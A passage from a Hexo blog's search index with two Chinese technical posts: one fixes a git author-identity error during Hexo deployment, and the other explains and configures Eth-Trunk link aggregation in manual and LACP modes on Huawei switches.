<h2 id="安装相关依赖包"><a href="#安装相关依赖包" class="headerlink" title="安装相关依赖包"></a>安装相关依赖包</h2><p>先安装node.js。<br>进入hexo根目录，执行一下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>

<h2 id="更改-git目录下config文件"><a href="#更改-git目录下config文件" class="headerlink" title="更改.git目录下config文件"></a>更改.git目录下config文件</h2><p>解决完依赖之后上传时发现报错，报错如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Author identity unknown</span><br><span class="line"></span><br><span class="line">*** Please tell me who you are.</span><br><span class="line"></span><br><span class="line">Run</span><br><span class="line"></span><br><span class="line">  git config --global user.email &quot;you@example.com&quot;</span><br><span class="line">  git config --global user.name &quot;Your Name&quot;</span><br><span class="line"></span><br><span class="line">to set your account&#x27;s default identity.</span><br><span class="line">Omit --global to set the identity only in this repository.</span><br><span class="line"></span><br><span class="line">fatal: unable to auto-detect email address (got &#x27;Administrator@DESKTOP-FAUCT7P.(none)&#x27;)</span><br></pre></td></tr></table></figure>

<p>解决办法为在博客根目录下找到.git目录下config文件，<br>文件路径为F:\blog.deploy_git.git\config<br>在config文件末尾添加以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[user]</span><br><span class="line">email=your email</span><br><span class="line">name=your name</span><br></pre></td></tr></table></figure>
<p>再次上传发现可以上传并无报错。</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>链路聚合Eth-Trunk简述与配置</title>
    <url>/archives/98a4d28.html</url>
    <content><![CDATA[<p>   以太网链路聚合Eth-Trunk简称链路聚合，通过将多个物理接口捆绑为一个逻辑接口，可以在不进行硬件升级的情况下，达到增加链路带宽的目的。</p>
<span id="more"></span>

<h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><p>1、增加带宽</p>
<ul>
<li>链路聚合接口的最大带宽可以达到各成员接口带宽之和。</li>
</ul>
<p>2、提高可靠性</p>
<ul>
<li>当某条活动链路出现故障时，流量可以切换到其他可用的成员链路上，从而提高链路聚合接口的可靠性。</li>
</ul>
<p>3、负载分担</p>
<ul>
<li>在一个链路聚合组内，可以实现在各成员活动链路上的负载分担。</li>
</ul>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/network/eth-trunk/QQ%E6%88%AA%E5%9B%BE20210422134025.png"></p>
<p>因为STP的原因，如果出现这种网络，按照STP的算法，SWA与SWB之间的链路，是必然会被阻塞两个的。</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/network/eth-trunk/QQ%E6%88%AA%E5%9B%BE20210422134546.png"></p>
<p>而配置了链路聚合后，这三条链路从逻辑意义上便成为了一条链路，变成1+1+1=3，同时因为是一条链路，所以不可能出现环路。</p>
<p>对于链路聚合，一共有两种方式，分别是：手工负载分担模式、LACP模式。</p>
<p>不过需要注意的是，无论在哪种模式下，在一个聚合口中，聚合链路两端的物理口（既成员口）的所有参数必须一致，包括物理口的数量，传输速率，双工模式和流量控制模式。</p>
<h2 id="手工负载分担模式"><a href="#手工负载分担模式" class="headerlink" title="手工负载分担模式"></a>手工负载分担模式</h2><p>Eth-Trunk的建立、成员接口的加入由手工配置，因为没有LACP协议的参与，所以该模式下的每个接口都是出于活跃状态，都会参与数据的转发工作，同时对于流量可以进行负载发送的方式。</p>
<p>而假如此时其中一条分担链路出现故障之后，链路聚合组会自动在剩余的活动链路中平均分担流量，假如有某些链路不支持LACP协议的话，那就可以使用手工的方式进行配置。</p>
<h2 id="LACP模式"><a href="#LACP模式" class="headerlink" title="LACP模式"></a>LACP模式</h2><p>在LACP模式中，链路两端的设备相互发送LACP报文，协商聚合参数。</p>
<p>协商完成后，两台设备确定活动接口和非活动接口。在LACP模式中，需要手动创建一个Eth-Trunk口，并添加成员口。</p>
<p>LACP协商选举活动接口和非活动接口。</p>
<p>LACP模式也叫M:N模式。M代表活动成员链路，用于在负载均衡模式中转发数据。N代表非活动链路，用于冗余备份。如果一条活动链路发生故障，该链路传输的数据被切换到一条优先级最高的备份链路上，这条备份链路转变为活动状态。</p>
<p>手工负载分担和LACP模式区别在于，LACP模式会有一些链路负责备份，而手工负载则不会出现这种问题。</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="华为"><a href="#华为" class="headerlink" title="华为"></a>华为</h3><ul>
<li>手工负载分担模式</li>
</ul>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/network/eth-trunk/QQ%E6%88%AA%E5%9B%BE20210422154151.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SW1]interface Eth-Trunk 1 //创建聚合口</span><br><span class="line">[SW1]interface Ethernet0/0/1 //选择汇聚口</span><br><span class="line">[SW1-Ethernet0/0/1]eth-trunk 1 //加入聚合口</span><br><span class="line">[SW1]interface Ethernet0/0/2</span><br><span class="line">[SW1-Ethernet0/0/2]eth-trunk 1</span><br><span class="line">[SW1]interface Ethernet0/0/3</span><br><span class="line">[SW1-Ethernet0/0/3]eth-trunk 1</span><br><span class="line">[SW1]display interface Eth-Trunk 1 // 查看聚合口状态</span><br></pre></td></tr></table></figure>

<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/network/eth-trunk/QQ%E6%88%AA%E5%9B%BE20210422140014.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/network/eth-trunk/QQ%E6%88%AA%E5%9B%BE20210422140054.png"></p>
<p>两端配置完之后，查看聚合端口状态可以看到聚合已经成功，因为是手工负载分担，所以所有的端口都是UP状态。</p>
<ul>
<li>LACP模式</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SW1]interface Eth-Trunk 1</span><br><span class="line">[SW1-Eth-Trunk1]mode lacp-static //修改模式为LACP</span><br><span class="line">[SW1]interface Ethernet0/0/1 //选择汇聚口</span><br><span class="line">[SW1-Ethernet0/0/1]eth-trunk 1 //加入聚合口</span><br><span class="line">[SW1]interface Ethernet0/0/2</span><br><span class="line">[SW1-Ethernet0/0/2]eth-trunk 1</span><br><span class="line">[SW1]interface Ethernet0/0/3</span><br><span class="line">[SW1-Ethernet0/0/3]eth-trunk 1</span><br><span class="line">[SW1]display interface Eth-Trunk 1 // 查看聚合口状态</span><br></pre></td></tr></table></figure>

<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/network/eth-trunk/QQ%E6%88%AA%E5%9B%BE20210422162758.png"></p>
<p>发现竟然还是三个都是UP，默认情况下，活跃的链路不进行设置时，默认最多可支持8条链路聚合，如果要实现两条链路使用，一条链路备份，此时，需要进行一条命令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SW1]interface Eth-Trunk 1</span><br><span class="line">[SW1-Eth-Trunk1]max active-linknumber 2</span><br></pre></td></tr></table></figure>

<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/network/eth-trunk/QQ%E6%88%AA%E5%9B%BE20210422165626.png"></p>
<p>可以看到，已经有两条链路UP，而一条链路down掉了。</p>
<p>此时DOWN掉的接口为G0/0/3口，如果我想要DOWN掉1口，让1口处于备份状态，应该如何配置呢？</p>
<p>LACP模式下可以通过配置接口LACP优先级来区分不同接口被选为活动接口的优先程度，优先级高的接口将优先被选为活动接口。</p>
<p>可以通过全局及接口下进行配置，双方各有特点。系统LACP优先级值越小优先级越高，缺省情况下，系统LACP优先级为32768。</p>
<p>这里以接口下进行举例，实际工作场景中，以接口下配置为优先。</p>
<p>注意：也要在协商两端进行配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SW1]interface eth0/0/3</span><br><span class="line">[SW1-Ethernet0/0/3]lacp priority 0</span><br></pre></td></tr></table></figure>

<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/network/eth-trunk/QQ%E6%88%AA%E5%9B%BE20210422172845.png"></p>
<p>可以看到，现在备份端口已经从G0/0/3口变为G0/0/1口，配置成功！</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://zhuanlan.zhihu.com/p/111629476">交换机进阶篇* 链路聚合</a></li>
</ul>
]]></content>
      <categories>
        <category>网络与自动化</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>Eth-Trunk</tag>
      </tags>
  </entry>
</search>
